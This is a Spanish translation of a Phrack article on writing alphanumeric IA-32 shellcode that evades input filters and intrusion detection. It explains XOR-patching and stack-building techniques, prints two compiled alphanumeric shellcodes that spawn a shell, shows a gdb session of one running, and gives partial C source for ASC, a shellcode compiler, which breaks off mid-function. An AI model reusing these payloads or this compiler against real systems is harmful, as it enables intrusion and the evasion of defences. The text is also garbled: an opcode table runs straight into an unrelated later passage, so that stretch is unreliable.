                             ==Phrack Inc.==

             Volumen 0x0b, Numero 0x39, Archivo #0x0f de 0x12

|=---------=[ Escribiendo shellcodes alfanumericos para ia32 ]=----------=|
|=-----------------------------------------------------------------------=|
|=--------------------------=[ rix@hert.org ]=---------------------------=|



----| Introduccion

Hoy, mas y mas exploits necesitan ser escritos usando assembler,
particularmente para escribir shellcodes clasicos (para buffer overflows,
o ataques format string,...).

Varios programas ahora alcanzan poderosos filtrados input, usando funciones
como strspn() o strcspn(): previene a la gente de insertar facilmente
shellcodes en diferentes buffers.
En la misma forma, observamos mas y mas IDS detectando secuencias de opcodes
sospechosas, algunas de ellas indicando la presencia de un shellcode.

Una forma de evadir tales tecnicas de coincidencia de patron es usar
polimorfismo, como usando herramientas tales como ADMmutate de K2.
Otra forma de hacer esto va a ser presentada aqui: trataremos de escribir
shellcodes IA32 no filtrables, usando solo caracteres alfanumericos: mas
precisamente, usaremos solo caracteres como '0'->'9','A'->'Z' y 'a'->'z'.

Si podemos escribir tales shellcodes alfanumericos, podremos guardar nuestros
shellcodes casi en donde sea! Vamos a enumerar algunas posibilidades
interesantes:
- inputs filtrados
- variables de entorno
- comandos clasicos, instrucciones y parametros desde protocolos usuales
- nombres de archivo y directorios
- nombres de usuario y passwords
- ...



----| Las instrucciones utilizables

Antes de empezar a pensar acerca de tecnicas particulares, vamos a echar una
mirada primero a las instrucciones de IA32 que seran interesantes para
nosotros.

Primero que todo, algunas convenciones (desde las referencias Intel) que
usaremos en nuestros arrays sumarios:

 <r8>          : indica un registro byte.
 <r32>         : indica un registro doubleword.
 <r/m8>        : indica un registro byte o un byte desde memoria (a traves
                 de un puntero).
 <r/m32>       : indica un registro doubleword o un doubleword desde
                 memoria (a traves de un puntero).
 </r>          : indica que el byte de instruccion es seguido de
                 varios posibles bytes operando. Uno de esos bytes, el
                 "ModR/M byte", nos permite especificar la forma de
                 direccionamiento usada, con la ayuda de campos de 3 bits.

                     ModR/M byte:                 
                     
                    7 6 5 4 3 2 1 0 
                   +---+-----+-----+
                   |mod|  r  | r/m |
                   +---+-----+-----+
                   
                 En este caso, la </r> nos indica que el ModR/M byte
                 contendra un registro operando y un registro o memoria
                 operando.
 <imm8>        : indica un valor de byte inmediato.
 <imm32>       : indica un valor doubleword inmediato.
 <disp8>       : indica un desplazamiento firmado de 8 bits.
 <disp32>      : indica un desplazamiento firmado de 32 bits.
 <...>         : indica que la instruccion necesita posiblemente algunos
                 operandos (eventualmente encodeados en varios bytes operando)

OPCODES ALFANUMERICOS:

Ahora, vamos a recordar todas las instrucciones con opcodes alfanumericos:

opcode hexadecimal | char | instruccion                    | interesante
 realizando una operacion NOT en el valor original. Debemos entonces cancelar
 el efecto de esta operacion, realizando una operacion NOT de nuevo pero esta
 vez en la pila (lee alphanumeric_stack_generate_not() en asc.c).

  1 BYTE:
   push esp
   pop ecx                        ;ECX ahora contiene ESP.
                                  ; N1
   xor [ecx],<r8>                 ; B1

  2 BYTES:
   push esp
   pop ecx                        ;ECX ahora contiene ESP.
                                  ; N2  N1
   xor [ecx],<r16>                ; B2  B1

  3 BYTES:
   push esp
   pop ecx                        ;ECX ahora contiene ESP.
                                  ;     N3  N2  N1
   dec ecx                        ; ??  N3  N2  N1
   xor [ecx],<r32>                ; ??  B3  B2  B1
   inc ecx                        ;     B3  B2  B1

  4 BYTES:
   push esp
   pop ecx                        ;ECX ahora contiene ESP.
                                  ; N4  N3  N2  N1
   xor [ecx],<r32>                ; B4  B3  B2  B1

Mientras agregamos cada uno de esos peque~os codigos, con los valores
apropiados, para nuestro shellcode alphanumerico, generaremos un shellcode
alfanumerico que construira nuestro shellcode no alfanumerico en la pila.


USANDO "XOR PATCHES":

Otra posibilidad es tomar ventaja de un modo de direccionamiento interesante,
usando ambos bytes ModR/M y SIB en combinacion con la siguiente instruccion
XOR (lee alphanumeric_patches_generate_xor() y la opcion "-m patches" en
asc.c):

 xor [<base>+2*<index>+<disp8>],<r8>
 xor [<base>+2*<index>+<disp8>],<r16> 
 xor [<base>+2*<index>+<disp8>],<r32>

Supon que tenemos una arquitectura tal para nuestro shellcode:

 [initialization][patcher][               data                ]

Podemos inicializar algunos valores y registros en [initialization], despues
usar instrucciones XOR en [patcher] para patchear bytes en [data]:
(lee alphanumeric_patches_generate() en asc.c)

 [initialization][patcher][shellcode original no alfanumerico]

Para usar esta tecnica, necesitamos saber la direccion de comienzo de nuestro
shellcode. Podemos guardala en un registro <base>, como EBX o EDI.
Debemos entonces calcular el offset para el primer byte no alfanumerico a
patchear, y generar este offset de nuevo usando un registro <index> y un
valor <disp8> alfanumerico:

 [initialization][patcher][shellcode original no alfanumerico]
  |                        |
<base>         <base>+2*<index>+<disp8>

El principal tema aqui es que nuestro offset va a depender del largo de
nuestro [initialization] y [patcher]. Ademas, este offset no es
necesariamente alfanumerico. Por lo tanto, generaremos este offset en
[initialization], escribiendolo en la pila con nuestra tecnica previa.

Trataremos de generar el mas peque~o [initialization] posible, incrementando
gradualmente un offset arbitrario, tratando de guardar el codigo para
calcularlo en [initialization], y posiblemente agregar algunos bytes rellenos
(lee alphanumeric_patches_generate_initialization() en asc.c):

 Primer repeticion:
  [######################][patcher][data]
                           |
                         offset                         
  [codigo para generar este offset] => demasiado grande.

 Segunda repeticion:
  [##########################][patcher][data]
                               |
                         --->offset                         
  [  codigo para generar este offset  ] => demasiado grande.

 Na repeticion:
  [#######################################][patcher][data]
                                            |
                         ---------------->offset
  [ codigo para generar este offset ] => perfecto.

 Agregando algunos bytes de relleno:
  [#######################################][patcher][data]
                                            |
                         ---------------->offset
  [ codigo para generar este offset ][relleno] =>para obtener el tama~o exacto.

 Y finalmente el shellcode compilado:
  [ codigo para generar el offset  ][relleno][patcher][data]

Tambien repetiremos en el valor <disp8>, porque algunos valores pueden darnos
un offset facil de generar.
Que contendra la [data] en tiempo de ejecucion?
Usaremos exactamente las mismas manipulaciones que para la "tecnica de pila",
excepto que aqui, podemos (DEBEMOS !!!) tener directamente guardados valores
alfanumericos en nuestra [data].

Otro problema es que solo podemos usar registros <r8>,<r16> o <r32>.
Nos previene de patchear 3 bytes con solo una instruccion XOR sin modificar
bytes previos o siguientes.

Finalmente, una vez patcheados algunos bytes, debemos incrementar nuestro
offset para obtener los siguientes bytes que necesitamos patchear. Podemos
simplemente incrementar nuestro <base>, o incrementar nuestro valor <disp8>
si <disp8> es siempre alfanumerico.


Para finalizar esta descripcion de las tecnicas, recordemos de nuevo que no
podemos usar todos los registros y modos de direccionamiento... Solo podemos
usar los que son "compatibles con alfanumericos". Por ejemplo, en la "tecnica
de patching XOR", decidimos usar los siguientes registros:

 <base> = ebx | edi
 <index> = ebp
 XOR register = eax | ecx
 NOT register = dl | dh | edx | esi

Notemos que esos registros son ubicados al azar, para agregar algunas
habilidades basicas de polimorfismo (lee alphanumeric_get_register() en
asc.c).



----| Algunas arquitecturas y consideraciones


Ahora, analizaremos diferentes arquitecturas generales y consideraciones para
generar shellcodes alfanumericos.


Para la "tecnica de patching XOR", la unica traba que tenemos que conocer
es la direccion de nuestro shellcode. Usualmente esto es trivial: usamos esta
direccion para overflowear una direccion de retorno. Por ejemplo, si
sobreescribimos un valor de retorno, podemos recuperarlo facilmente al
principio de nuestro shellcode (lee alphanumeric_get_address_stack() y
la opcion "-a stack" en asc.c):

 dec esp
 dec esp
 dec esp
 dec esp
 pop <r32>

La direccion puede tambien ser guardada en un registro (ve la opcion
"-a <r32>" en asc.c). En este caso, no sera necesaria ninguna manipulacion
preliminar.


Para la "tecnica stack", podemos tener diferentes arquitecturas interesantes,
dependiendo de la posicion del buffer que tratamos de romper.
Analicemos algunos de ellos brevemente.

Si nuestro shellcode esta en la pila, seguido por suficiente espacio y por
una direccion de retorno, esto es realmente perfecto. Miremos que esta
pasandole a nuestra pila:

 .... AA  AA  AA  AA  00  00  00  00  00  00  RR  RR  RR  RR  SS  SS ....
     [EIP]                                                   [ESP]

 .... AA  AA  AA  AA  00  00  00  00  00  00  RR  BB  BB  BB  SS  SS ....
      -->[EIP]                                   [ESP]<---------

Nuestro shellcode no alfanumerico desciende para encontrar al final de
nuestro shellcode compilado. Una vez que hemos construido nuestro
shellcode original entero, podemos simplemente construir instrucciones
relleno para conectar ambas shellcodes.

 .... AA  AA  AA  AA  PP  PP  PP  PP  PP  PP  RR  BB  BB  BB  SS  SS ....
      ------>[EIP]   [ESP]<-------------------------------------

 .... AA  AA  AA  AA  PP  PP  PP  PP  PP  PP  RR  BB  BB  BB  SS  SS ....
      -------------------------------------->[EIP]

Donde: AA representa bytes de nuestro shellcode alfanumerico compilado.
       00 representa posiciones no usadas en la pila.
       SS representa bytes ya presentes en la pila.
       RR representa bytes de nuestra direccion de retorno.
       BB representa bytes de nuestro shellcode generado no alfanumerico.
       PP representa bytes de instrucciones simples de relleno (ej: INC ECX).

Para usar este metodo, debemos tener un shellcode original con un tama~o menor
comparado con el espacio entre el final de nuestro shellcode compilado y el
valor de ESP al principio de la ejecucion de nuestro shellcode.
Debemos tambien estar seguros de que las ultimas manipulaciones en la pila
(para generar instrucciones de relleno) no sobreescribiran las ultimas
instrucciones de nuestro shellcode compilado. Si nosotros simplemente
generamos instrucciones de relleno alfanumericas, no deberia haber ningun
problema.
Podemos tambien agregar algunas instrucciones de relleno al final de nuestro
shellcode alfanumerico compilado, y dejarlas ser sobreescritas por nuestras
instrucciones de relleno generadas. Este consideracion es interesante para
fuerza bruta (ve la opcion "-s null" en asc.c).

Podemos tambien proceder en una forma ligeramente diferente, si el espacio
entre nuestro shellcode compilado y el shellcode original tiene un largo
alfanumerico (<disp8> alfanumerico). Simplemente usamos 2 saltos
condicionales inversos, como estos:

 [final de nuestro shellcode compilado]
 jo <disp8>+1 -+
               |
 jno <disp8> --+
               |
 ...           |
               |
label: <-------+
 [comienzo de nuestro shellcode original no alfanumerico]


Podemos tambien combinar tecnicas "stack" y "patches". Construimos nuestro
shellcode original en la pila (1), y simplemente saltamos (jump) a el
una vez construido (3). El problema es que no tenemos instrucciones jump
alfanumericas. Generaremos JMP ESP simplemente usando la "tecnica de patches"
(2) en un byte (ve la opcion "-s jmp" en asc.c):

                                            +--patch (2)-+
                                            |            |
 [codigo no alfanumerico construyendo][JMP ESP codigo patcheando][jmp esp]
               |                                               |
 +-------------+---------jump (3)------------------------------+
 |             |
 |           construir (1)
 |             |
 +-> [codigo no alfanumerico]

Podemos tambien reemplazar el JMP ESP por la siguiente secuencia, mas facil
de generar (ve la opcion "-s ret" en asc.c):

 push esp
 ret


Finalmente, podemos generar todavia otro estilo de shellcode. Supon que
tenemos un shellcode no alfanumerico realmente grande. Quiza es mas
interesante para comprimirlo, y escribir un motor peque~o de descompresion
no alfanumerico (ve la opcion "-s call" en asc.c):

                                            +--patch (2)--+
                                            |             |
 [codigo no alfanumerico construyendo][CALL ESP codigo patcheando][call esp]
 [data]
               |                                                 |
 +-------------+---------call (3)--------------------------------+
 |             |
 |           construir (1)
 |             |
 |   <---------+-------------------------------->
 |
 +-> [pop <r32>][motor de descompresion][jmp <r32>]
         (4)             (5)              (6)

Una vez que CALL ESP es ejecutado (3), la direccion de [data] es pusheada en
la pila. El motor solo tiene que popearlo en un registro (4), puede entonces
descomprimir los datos para construir el shellcode original (5), y finalmente
saltar a el (6).

Como podemos ver, las posibilidades son realmente inacabables!



----| ASC, un Alphanumeric Shellcode Compiler
             (Compilador de Shellcode Alfanumerico)


ASC ofrece algunas de las tecnicas propuestas arriba.
Que hay sobre de las posibles opciones?


OPCIONES DE COMPILACION:

Estas opciones nos permiten especificar las tecnicas y arquitectura que
nuestro shellcode alfanumerico usara para construir el shellcode original.

-a[ddress] stack|<r32> : permite especificar la direccion de comienzo del
 shellcode (util para la tecnica de patching).
 "stack" significa que obtenemos la direccion de la pila.
 <r32> permite especificar un registro conteniendo esta direccion de
 comienzo.

-m[ode] stack|patches : permite elegir el tipo de shellcode alfanumerico
que queremos generar.
 "stack" genera nuestro shellcode en la pila.
 "patches" genera nuestro shellcode por XOR patching.

-s[tack] call|jmp|null|ret : especifica el metodo (si "-m stack") para
 volver al shellcode original en la pila.
 "call" usa una instruccion CALL ESP.
 "jmp" usa una instruccion JMP ESP.
 "null" no vuelve al codigo (si el codigo original esta justo despues del
 shellcode alfanumerico).
 "ret" usa PUSH ESP e instrucciones RET.


OPCIONES DE DEBUGGING:

Estas opciones nos permiten insertar algunos breakpoints (int3), y observar
la ejecucion de nuestro shellcode alfanumerico.

-debug-start : inserta un breakpoint al principio del shellcode compilado.

-debug-build-original : inserta un breakpoint antes de construir el shellcode
 original.

-debug-build-jump : inserta un breakpoint antes de construir el codigo jump
 (si especificamos la opcion -s). Inutil si "-s null".

-debug-jump : inserta un breakpoint antes de ejecutar la instruccion jump
 (si especificamos la opcion -s). Si "-s null", el breakpoint simplemente
 estara al final del shellcode alfanumerico.

-debug-original : inserta un breakpoint al principio del shellcode original.
 Este breakpoint sera construido en el tiempo de ejecucion.


OPCIONES INPUT/OUTPUT:

-c[har] <char[] name> : especifica una nombre de variable C donde un
 shellcode es guardado:
 
 char array[]= "blabla" /* mi shellcode */
               "blabla";
 
 Si ningun nombre es especificado y varios arrays char[] estan presentes,
 el primero sera usado. El parsing reconoce comentarios de C y arrays
 multi-linea. Esta opcion tambien nos asegura que el archivo input es un
 archivo C, y no un archivo binario.

-f[ormat] bin|c : especifica el formato output de archivo. Si es elegido el
 formato de C, ASC escribe un codigo minusculo para ejecutar el shellcode
 alfanumerico, simulando un overflow en la direccion RET. Este codigo no
 puede correr correctamente si las opciones "-a <r32>" o "-s null" fueron
 usadas.

-o[utput] <archivo output> : permite especificar el nombre de archivo output.


EJEMPLOS:

Finalicemos con algunos ejemplos practicos, usando shellcodes desde lindos
previos textos de Phrack ;)


Primero, echa un vistazo a P49-14 (Texto de Aleph One).
El primer shellcode que el escribio (testsc.c) contiene 00 bytes (normalmente
no es un problema para ASC). Nosotros generamos un archivo C y un shellcode
alfanumerico usando "patches XOR":

 rix@debian:~/phrack$ ./asc -c shellcode -f c -o alpha.c p49-14
 Reading p49-14 ... (61 bytes)
 Shellcode (390 bytes):
 LLLLYhb0pLX5b0pLHSSPPWQPPaPWSUTBRDJfh5tDSRajYX0Dka0TkafhN9fYf1Lkb0TkdjfY0Lkf0Tkgfh6rfYf1Lki0tkkh95h8Y1LkmjpY0Lkq0tkrh2wnuX1Dks0tkwjfX0Dkx0tkx0tkyCjnY0LkzC0TkzCCjtX0DkzC0tkzCj3X0Dkz0TkzC0tkzChjG3IY1LkzCCCC0tkzChpfcMX1DkzCCCC0tkzCh4pCnY1Lkz1TkzCCCCfhJGfXf1Dkzf1tkzCCjHX0DkzCCCCjvY0LkzCCCjdX0DkzC0TkzCjWX0Dkz0TkzCjdX0DkzCjXY0Lkz0tkzMdgvvn9F1r8F55h8pG9wnuvjrNfrVx2LGkG3IDpfcM2KgmnJGgbinYshdvD9d
 Writing alpha.c ...
 Done.
 rix@debian:~/phrack$ gcc -o alpha alpha.c
 rix@debian:~/phrack$ ./alpha
 sh-2.03$ exit
 exit
 rix@debian:~/phrack$

Prece funcionar perfectamente. Notemos que el shellcode alfanumerico es
tambien escrito para stdout.


Ahora, compilemos el shellcode de Klog (P55-08). Elegimos la "tecnica de la
pila", con un JMP ESP para volver a nuestro shellcode original. Tambien
insertamos algunos breakpoints:

 rix@debian:~/phrack$ ./asc -m stack -s jmp -debug-build-jump
  -debug-jump -debug-original -c sc_linux -f c -o alpha.c P55-08
 Reading P55-08 ... (50 bytes)
 Shellcode (481 bytes):
 LLLLZhqjj9X5qjj9HPWPPSRPPafhshfhVgfXf5ZHfPDhpbinDfhUFfXf5FifPDSDhHIgGX516poPDTYI11fhs2DTY01fhC6fXf5qvfPDfhgzfXf53EfPDTY01fhO3DfhF9fXf5yFfPDTY01fhT2DTY01fhGofXf5dAfPDTY01fhztDTY09fhqmfXf59ffPDfhPNDfhbrDTY09fhDHfXf5EZfPDfhV4fhxufXf57efPDfhl5DfhOSfXf53AfPDfhV4fhFafXf5GzfPDfhxGDTY01fh4IfXf5TFfPDfh7VDfhhvDTY01fh22fXf5m5fPDfh3VDfhWvDTY09fhKzfXf5vWfPDTY01fhe3Dfh8qfXf5fzfPfhRvDTY09fhXXfXf5HFfPDfh0rDTY01fhk5fXf5OkfPfhwPfXf57DfPDTY09fhz3DTY09SQSUSFVDNfhiADTY09WRa0tkbfhUCfXf1Dkcf1tkc3UX
 Writing alpha.c ...
 Done.
 
 rix@debian:~/phrack$ gcc -o alpha alpha.c 
 rix@debian:~/phrack$ gdb alpha
 GNU gdb 19990928
 Copyright 1998 Free Software Foundation, Inc.
 GDB is free software, covered by the GNU General Public License, and you are
 welcome to change it and/or distribute copies of it under certain conditions.
 Type "show copying" to see the conditions.
 There is absolutely no warranty for GDB.  Type "show warranty" for details.
 This GDB was configured as "i686-pc-linux-gnu"...
 (no debugging symbols found)... 
 (gdb) run
 Starting program: /home/rix/phrack/alpha
 (no debugging symbols found)...(no debugging symbols found)...
 Program received signal SIGTRAP, Trace/breakpoint trap.
 0xbffffb1d in ?? ()                          ;-debug-build-jump 
 (gdb) x/22i 0xbffffb1d
 0xbffffb1d:     push   %ebx
 0xbffffb1e:     push   %ecx
 0xbffffb1f:     push   %ebx                  ;EDX contendra 0xFFFFFFFF.
 0xbffffb20:     push   %ebp
 0xbffffb21:     push   %ebx
 0xbffffb22:     inc    %esi                  ;ESI contiene 0xFFFFFFFF.
 0xbffffb23:     push   %esi                  ;ESI contiene 0.
 0xbffffb24:     inc    %esp                  ;00 00 00 en la pila.
 0xbffffb25:     dec    %esi                  ;restaura ESI.
 0xbffffb26:     pushw  $0x4169               ;pushea un word alfanumerico.
 0xbffffb2a:     inc    %esp                  ;un byte alfanumerico en la
                                              ;pila.
 0xbffffb2b:     push   %esp
 0xbffffb2c:     pop    %ecx                  ;ECX contiene ESP (la
                                              ; direccion del byte).
 0xbffffb2d:     xor    %bh,(%ecx)            ;NOT en este byte (EBP
                                              ; contendra el offset dword).
 0xbffffb2f:     push   %edi                  ;ESI contendra 0xFFFFFFFF.
 0xbffffb30:     push   %edx
 0xbffffb31:     popa
 0xbffffb32:     xor    %dh,0x62(%ebx,%ebp,2) ;NOT en el primer byte para
                                              ;patchear (nuestro 0xCC, int3)
                                              ; Notemos el uso de
                                              ; <disp8> alfanumerico, el
                                              ; uso de EBX (direccion de
                                              ; nuestro shellcode)
                                              ; y el uso de EBP
                                              ; (el offset previamente
                                              ; guardado).
 0xbffffb36:     pushw  $0x4355
 0xbffffb3a:     pop    %ax                   ;AX contiene 0x4355.
 0xbffffb3c:     xor    %ax,0x63(%ebx,%ebp,2) ;XOR los siguientes dos bytes
                                              ; (<disp8> es ahora 0x63).
 0xbffffb41:     xor    %si,0x63(%ebx,%ebp,2) ;NOT estos 2 bytes.
 (gdb) x/3bx 0xbffffb41+5                     ;O16 + XOR + ModR/M +
                                              ; SIB + <disp8> = 5 bytes
 0xbffffb46:     0x33    0x55    0x58         ;Los 3 bytes que patcheamos:
                                              ; NOT 0x33 = 0xCC => INT 3
                                              ; NOT (0x55 XOR 0x55) = 0xFF
                                              ; NOT (0x43 XOR 0x58) = 0xE4
                                              ;  => JMP ESP
 (gdb) cont
 Continuing.

 Program received signal SIGTRAP, Trace/breakpoint trap.
 0xbffffb47 in ?? ()                          ;-debug-jump
 (gdb) x/1i 0xbffffb47
 0xbffffb47:     jmp    *%esp                 ;nuestro jump
 (gdb) info reg esp
 esp            0xbffffd41       -1073742527
 (gdb) cont                                   ;Ejecutemos este JMP ESP.
 Continuing.

 Program received signal SIGTRAP, Trace/breakpoint trap.
 0xbffffd42 in ?? ()                          ;(ESP previo)+1
                                              ; (por nuestro INT3). Estamos
                                              ; ahora en nuestro shellcode
                                              ; original.
 (gdb) cont                                   ;Ejecutemoslo ;)
 Continuing.
 sh-2.03$ exit                                ;Finalmente!!!
 exit
 (no debugging symbols found)...(no debugging symbols found)...
 Program exited normally.
 (gdb)



----| Conclusion


Escribir shellcodes alfanumericos para IA32 es finalmente facilmente posible.
Pero usar solo direcciones alfanumericas es menos obvio. Ciertamente, ese es
el principal problema encontrado cuando simplemente queremos usar caracteres
alfanumericos.

En algunos casos particulares, sera sin embargo posible. Trataremos de
volver a instrucciones que vuelven ellas mismas para nuestro shellcode.
Por ejemplo, en sistemas Win32, podemos a veces encontrar interesantes
instrucciones en direcciones como 0x0041XXXX (XX son caracteres
alfanumericos). Por lo que podemos generar tales direcciones de retorno.
El sobreescribimiento parcial de direcciones es a veces tambien interesante,
porque podemos tomar ventaja de bytes ya presentes en la pila, y
principalmente tomar ventaja del byte nulo (que no podemos generar),
automaticamente copiado al final de la cadena C.
Nota que, a veces, dependiendo de que tratamos de exploitear, podemos usar
algunos otros caracteres, por ejemplo '_', '@', '-' o clasicos caracteres.
Es obvio, en esos casos, que necesitaran ser muy precisos.


La "tecnica de la pila" parece necesitar una pila ejecutable... Pero podemos
modificar el valor de ESP al principio de nuestro shellcode, y llevarlo
apuntando a nuestro monton. Sin embargo, necesitamos patchear la instruccion
POP ESP, porque no esta "compilada alfanumericamente".

Excepto, el tama~o (posiblemente conlleve problemas), tambien debemos
mencionar otras desventajas de estas tecnicas: los shellcodes compilados son
vulnerables a conversiones toupper()/tolower(). Escribiendo un shellcode
alfanumerico y resistente a toupper()/tolower() es una tarea casi imposible
(recuerda el primer array, con instrucciones utilizables).


Este texto muestra eso, contrariamente a las ideas recibidas, un codigo
ejecutable puede ser escrito, y guardado casi en donde sea. Nunca mas confies
en que un string se ve perfectamente legal: quiza es un shellcode bien
disfrazado ;)


Gracias y Hola a (la gente es ordenada alfanumericamente :P ):
- Phrack Staff
- Los chicos de Devhell, HERT & TESO: particularmente analyst, binf, gaius,
   mayhem, klog, kraken & skyper.
- dageshi, eddow, lrz, neuro, nite, obscurer, tsychrama.
                                                              rix@hert.org


----| Codigo

Esto deberia compilar bien en cualquier Linux box con "gcc -o asc asc.c".
Es distribuido bajo los terminos de la GNU GENERAL PUBLIC LICENSE.
Si tienes problemas o comentarios, contactame (rix@hert.org).

<++> asc.c !707307fc
/******************************************************************************
 *                ASC : IA 32 Alphanumeric Shellcode Compiler                 *
 ******************************************************************************
 *
 * VERSION: 0.9.1
 *
 *
 * LAST UPDATE: Fri Jul 27 19:42:08 CEST 2001
 *
 *
 * LICENSE:
 *  ASC - Alphanumeric Shellcode Compiler
 *
 *  Copyright 2000,2001 - rix
 *
 *  All rights reserved.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *
 *  THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 *  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 *  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 *  ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 *  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 *  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 *  OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 *  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 *  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 *  OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 *  SUCH DAMAGE.
 *
 *
 * POR HACER:
 *  - crear LibASC, una libreria conteniendo todas las funciones.
 *  - permitir especificacion de caracteres aceptables no-alfanumericos.
 *  - generar secuencias de instrucciones relleno.
 *  - encodear caracteres alfanumericos, para evitar coincidencia de patron.
 *  - insertar instrucciones basura (polimorfismo) y modificar existente.
 *  - optimizar "tecnica de patch" cuando el offset < 256 y es alfanumerico.
 *  - calcular automaticamente tama~o de relleno para la tecnica "stack sin
 *    jump".
 *  - Formato C output: simular direccion en registro, relleno,...
 *  - usar direcciones constantes para shellcode compilado.
 *  - modificar la direccion de comienzo de ESP para "tecnica stack".
 *  - modos de conversion de formatos simples de shellcode (no compilacion).
 *  - insertar espacios y puntuacion para imitar frases clasicas.
 *
 *
 * CONTACTO: rix <rix@hert.org>
 *
 ******************************************************************************/

#include <stdio.h>
#include <getopt.h>
#include <stdarg.h>
#include <string.h>
#include <time.h>

/* +------------------------------------------------------------------------+ */
/* |                       FUNCIONES DE NUMEROS RANDOM                      | */
/* +------------------------------------------------------------------------+ */

/* inicializar el generador de numeros pseudo-random */
/* ================================================= */
void random_initialize() {
 srand((unsigned int)time(0));
}


/* obtener un entero random i (0<=i<max) */
/* ===================================== */
int random_get_int(int max) {
 return (rand()%max);
}

/* +------------------------------------------------------------------------+ */
/* |                        FUNCIONES DE SHELLCODES                         | */
/* +------------------------------------------------------------------------+ */

/* esta estructura contendra todos nuestros shellcodes */
/* =================================================== */
struct Sshellcode {
 unsigned char* opcodes; /* opcodes bytes */
 int size; /* tama~o de opcodes bytes */
};


/* asignar una nueva estructura Sshellcode */
/* ======================================= */
struct Sshellcode *shellcode_malloc() {
 struct Sshellcode *ret;

 if ((ret=(struct Sshellcode*)malloc(sizeof(struct Sshellcode)))!=NULL) {
  ret->opcodes=NULL;
  ret->size=0;
 }
 return ret;
}


/* inicializar una estructura Sshellcode existente */
/* =============================================== */
void shellcode_zero(struct Sshellcode *shellcode) {
 if (shellcode==NULL) return;

 if (shellcode->opcodes!=NULL) free(shellcode->opcodes);
 shellcode->opcodes=NULL;
 shellcode->size=0;
}


/* liberar una estructura Sshellcode existente */
/* =========================================== */
void shellcode_free(struct Sshellcode *shellcode) {
 if (shellcode!=NULL) {
  shellcode_zero(shellcode);
  free(shellcode);
 }
}


/* devolver un string asignado desde un Sshellcode existente */
/* ========================================================= */
char *shellcode_malloc_string(struct Sshellcode *shellcode) {
 char *ret;

 if (shellcode==NULL) return NULL;

 if (shellcode->opcodes==NULL) return "";

 if ((ret=(char*)malloc(shellcode->size+1))==NULL) return NULL;
 memcpy(ret,shellcode->opcodes,shellcode->size);
 ret[shellcode->size]=0;
 return ret;
}


/* sobreescribir un Sshellcode existente con un Sshellcode */
/* ======================================================= */
struct Sshellcode *shellcode_cpy(struct Sshellcode *destination,struct Sshellcode *source) {
 if (destination==NULL) return NULL;

 shellcode_zero(destination);

 if (source!=NULL) {
  if (source->opcodes!=NULL) { /* if source contains a shellcode, we copy it */
   if ((destination->opcodes=(unsigned char*)malloc(source->size))==NULL) return NULL;
   memcpy(destination->opcodes,source->opcodes,source->size);
   destination->size=source->size;
  }
 }

 return destination;
}


/* apendizar un Sshellcode al final de un Sshellcode existente */
/* =========================================================== */
struct Sshellcode *shellcode_cat(struct Sshellcode *destination,struct Sshellcode *source) {
 if (destination==NULL) return NULL;

 if (destination->opcodes==NULL) shellcode_cpy(destination,source);
 else { /* el destino ya contiene un shellcode */

  if (source!=NULL) {
   if (source->opcodes!=NULL) { /* si el codigo contiene un shellcode, lo copiamos */

